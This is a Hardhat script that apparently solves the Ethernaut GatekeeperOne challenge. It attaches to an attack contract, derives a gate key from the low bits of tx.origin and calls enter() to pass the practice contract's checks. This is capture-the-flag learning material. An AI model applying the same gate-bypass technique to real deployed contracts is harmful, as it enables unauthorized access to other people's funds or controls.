const hre = require("hardhat");
const {utils} = require("ethers");

function sleep(s) {
    if (s > 0) {
        console.log(`Waiting for ${s} seconds`);
        return new Promise(resolve => setTimeout(resolve, s*1000));
    }
}

async function main() {


    console.log(`Operating in network ${hre.network.name}`)

    const [deployer] = await hre.ethers.getSigners();

    let holder = deployer.address;

    console.log(
    "Deploying contracts with the account:",
    deployer.address
    );
    
    console.log("Account balance:", (await deployer.getBalance()).toString());

    const GateKeeperOneFactory = await ethers.getContractFactory("GatekeeperOne");
    const GateKeeperOneInstance = await GateKeeperOneFactory.deploy();

    const AttackGateOneFactory = await ethers.getContractFactory("AttackGateOne");
    /* const AttackGateOneInstance = await AttackGateOneFactory.deploy(GateKeeperOneInstance.address); */

    /* const AttackGateOneInstance = await AttackGateOneFactory.deploy("0xC4046df343f619eaCC18CE1A7590676982ad46E5"); */
    const AttackGateOneInstance = await AttackGateOneFactory.attach("0x44A49231336367479deE09Ec575f2948265B9cB0");

    console.log(`uint16 of tx.origin is ${await AttackGateOneInstance._uint16_addr("0x0B27aeb5c4CB8007661bB79BFF4A62a7B0640Fe4")}`);

    const _gateKey = "0x1000000000000Fe4";

    console.log(`uint32 uint64 of _gateKey is ${await AttackGateOneInstance._uint32_uint64(_gateKey)}`);

    console.log(`uint16 uint64 of _gateKey is ${await AttackGateOneInstance._uint16_uint64(_gateKey)}`);

    console.log(`uint64 of _gateKey is ${await AttackGateOneInstance._uint64(_gateKey)}`);

    console.log(`AttackGateOne instance address ${AttackGateOneInstance.address}`); 

    const receipt = await AttackGateOneInstance.enter(_gateKey, {gasLimit: 200000});

    console.log(receipt);
    
   

    
    /* await sleep(90);
    await hre.run("verify:verify", {
        address: AttackGateOneInstance.address,
        constructorArguments: [GateKeeperOneInstance.address],
    })

    await hre.run("verify:verify", {
        address: GateKeeperOneInstance.address,
        constructorArguments: [],
    }) */
    

}

main()
    .then(() => process.exit(0))
    .catch(error => {
    console.error(error);
    process.exit(1);
    });